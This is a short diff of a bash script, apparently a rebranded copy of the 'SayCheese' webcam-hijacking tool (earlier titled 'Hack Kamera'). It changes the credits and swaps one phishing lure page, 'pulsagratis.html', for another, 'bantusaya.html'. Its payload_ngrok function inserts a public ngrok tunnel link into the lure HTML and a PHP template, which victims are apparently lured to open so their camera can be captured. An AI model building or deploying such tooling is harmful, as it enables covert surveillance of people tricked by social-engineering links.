@@ -1,6 +1,6 @@
 #!/bin/bash
-# Hack Kamera V.1
-# coded by MUKE_GILE.ID
+# SayCheese v1.0
+# coded by: github.com/thelinuxchoice/saycheese
 # If you use any part from this code, giving me the credits. Read the Lincense!
 
 trap 'printf "\n";stop' 2
@@ -123,7 +123,7 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' pulsagratis.html > index2.html
+sed 's+forwarding_link+'$link'+g' bantusaya.html > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 
